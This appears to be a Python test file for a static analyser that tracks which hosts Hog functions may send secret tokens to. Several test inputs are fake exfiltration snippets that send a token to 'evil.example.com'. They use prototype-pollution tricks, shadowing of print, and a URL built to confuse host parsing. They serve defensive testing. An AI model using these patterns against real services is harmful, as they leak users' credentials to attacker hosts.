        assert secret_origins(hog, inputs, [], secret_keys) == expected

    @parameterized.expand(
        [
            ("unsupported_code", f"let fetch := print\n{SENDS_TOKEN_TO_URL}", {}, nullcontext),
            ("input_cycle", SENDS_TOKEN_TO_URL, {"url": "{inputs.next}", "next": "{inputs.url}"}, nullcontext),
            (
                "iterations",
                f"let u := inputs.url\n{SENDS_TOKEN_TO_URL}",
                {},
                lambda: patch("products.cdp.backend.secret_origins._MAX_ITERATIONS", 1),
            ),
            (
                "budget",
                SENDS_TOKEN_TO_URL,
                {},
                lambda: patch("products.cdp.backend.secret_origins._MAX_EVALUATIONS", 1),
            ),
            (
                "budget",
                "let a0 := 'x'\n"
                + "".join(f"let a{n} := coalesce(a{n - 1}, a{n - 1})\n" for n in range(1, 31))
                + f"let same := a30 == 1\n{SENDS_TOKEN_TO_URL}",
                {},
                nullcontext,
            ),
            ("unsupported_code", "fetch('https://evil.example.com', {'body': inputs.token})()", {}, nullcontext),
            ("unsupported_code", f"options().headers := {{}}\n{SENDS_TOKEN_TO_URL}", {}, nullcontext),
            (
                "unsupported_code",
                f"fun outer() {{\n  fun print(x) {{ return x }}\n}}\nprint(inputs.token)\n{SENDS_TOKEN_TO_URL}",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                f"fun outer() {{\n  let print := (x) -> x\n}}\nprint(inputs.token)\n{SENDS_TOKEN_TO_URL}",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                f"print(inputs.token)\nfun print(x) {{ return x }}\n{SENDS_TOKEN_TO_URL}",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                "fetch('https://evil.example.com', {'__proto__': {'secret_headers_input': concat('to', 'ken')}})",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                "let options := {}\noptions.constructor := {'secret_headers_input': 'token'}\nfetch('https://evil.example.com', options)",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                "let headers := {}\nheaders['prototype'] := {'Host': 'evil.example.com'}\nfetch(inputs.url, {'headers': headers, 'body': inputs.token})",
                {},
                nullcontext,
            ),
            (
                "unsupported_code",
                "fetch(inputs.url, {'body': inputs.note})",
                {"note": "{print(inputs.token)('x')}"},
                nullcontext,
            ),
            (
                "unsupported_code",
                "fetch(inputs.url, {'body': inputs.note})",
                {"note": "{ {'__proto__': inputs.token} }"},
                nullcontext,
            ),
            ("unparseable", "fetch(inputs.url, {", {}, nullcontext),
            (
                "too_deep",
                f"fetch('https://hooks.example.com', {{'body': {'concat(' * 60}inputs.token{')' * 60}}})",
                {},
                lambda: _recursion_limit_above_here(40),
            ),
        ]
    )
    def test_code_it_cannot_analyze_leaves_its_secrets_unbound(
        self,
        reason: UnanalyzableReason,
        hog: str,
        inputs: dict[str, str],
        limit: Callable[[], AbstractContextManager[Any]],
    ) -> None:
        all_inputs = _inputs(**{"url": "https://hooks.example.com", "token": "t", **inputs})
        with limit():
            analysis = analyze_secret_origins(hog, all_inputs, [], {"token"})

        assert analysis == SecretOriginsAnalysis(origins={"token": UNBOUND}, unanalyzable=reason)

    def test_a_lambda_with_many_parameters_is_analyzed_in_bounded_memory(self) -> None:
        count = 3000
        params = ", ".join(f"p{n}" for n in range(count))
        hog = f"let f := ({params}) -> p0\nf({', '.join(map(str, range(count)))})\n{SENDS_TOKEN_TO_URL}"

        tracemalloc.start()
        try:
            analyze_secret_origins(hog, _inputs(url="https://hooks.example.com", token="t"), [], {"token"})
            _, peak = tracemalloc.get_traced_memory()
        finally:
            tracemalloc.stop()

        assert peak < 16 * 1024 * 1024

    def test_mapping_inputs_add_their_origins(self) -> None:
        mapping_inputs = [_inputs(url="https://mapped.example.com/a")]

        origins = secret_origins(
            SENDS_TOKEN_TO_URL, _inputs(url="https://hooks.example.com", token="t"), mapping_inputs, {"token"}
        )

        assert origins == {"token": _origins("https://hooks.example.com", "https://mapped.example.com")}

    @parameterized.expand(
        [
            ("https://API.Example.COM./a", _origins("https://api.example.com")),
            # The input is a hog template, which reads the doubled backslash as one literal backslash.
            (r"https://evil.example.com\\@good.example.com/a", UNBOUND),
        ]
    )
    def test_origin_of_a_literal_url(self, url: str, expected: SecretOrigins) -> None:
        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": expected}

    @parameterized.expand(
        [
            ("port", "https://hooks.example.com:" + "1" * 5000 + "/a"),
            ("host", "https://1.2.3." + "4" * 5000 + "/a"),
        ]
    )
    def test_origin_with_an_oversized_number(self, _name: str, url: str) -> None:
        assert secret_origins(SENDS_TOKEN_TO_URL, _inputs(url=url, token="t"), [], {"token"}) == {"token": UNBOUND}

    @parameterized.expand([(case["url"], case["origin"]) for case in ORIGIN_CASES])
    def test_url_origin_matches_the_worker(self, url: str, origin: str | None) -> None:
        assert url_origin(url, complete=True) == origin


_ENTERED_VALUE = "acme"
_ENTERED_VALUES_BY_TYPE: dict[str, Any] = {
    "dictionary": {},
    "json": {},
    "boolean": False,
    "integration": 1,
    "integration_field": 1,
}
# Saving a config change to one of these asks for the secret again, because the analysis cannot bind it.
_TEMPLATES_WITH_UNBOUND_SECRETS = {
    "template-airtable": "Debug logging prints the request, which carries the access token.",
    "template-rudderstack": "The host passes through `replaceAll`, whose result the analysis does not follow.",
}
_TEMPLATES_WITH_SECRETS = [
    template
    for template in HOG_FUNCTION_TEMPLATES
    if template.code_language == "hog" and any(schema.get("secret") for schema in template.inputs_schema)
]


def _configured_value(schema: dict[str, Any]) -> Any:
    if schema.get("default") not in (None, ""):
        return schema["default"]
    if schema.get("choices"):
        return schema["choices"][0]["value"]
    return _ENTERED_VALUES_BY_TYPE.get(schema.get("type", ""), _ENTERED_VALUE)


def _configured_inputs(schemas: list[dict[str, Any]]) -> dict[str, dict[str, Any]]:
    return {
        schema["key"]: {"value": _configured_value(schema), "templating": schema.get("templating")}
        for schema in schemas
    }


class TestShippedTemplateSecrets(SimpleTestCase):
    @parameterized.expand([(template.id, template) for template in _TEMPLATES_WITH_SECRETS])
    def test_each_secret_binds_to_hosts_the_template_names(
        self, template_id: str, template: HogFunctionTemplateDC
    ) -> None:
        schemas = [
            template.inputs_schema,
            *(mapping.inputs_schema or [] for mapping in template.mapping_templates or []),
        ]
        origins = secret_origins(
            template.code,
            _configured_inputs(schemas[0]),
            [_configured_inputs(mapping_schemas) for mapping_schemas in schemas[1:]],
            {schema["key"] for schema in template.inputs_schema if schema.get("secret")},
        )

        if template_id in _TEMPLATES_WITH_UNBOUND_SECRETS:
            assert UNBOUND in origins.values(), "The analysis binds this template now, so drop it from the exceptions."
            return
        named = template.code + json.dumps(schemas)
        unnamed = {
            key: sorted(
                host
                for origin in bound
                for host in [urlsplit(origin).hostname or ""]
                if any(label != _ENTERED_VALUE and label not in named for label in host.split("."))
            )
            if isinstance(bound, frozenset)
            else bound
            for key, bound in origins.items()
        }
        assert unnamed == dict.fromkeys(origins, [])
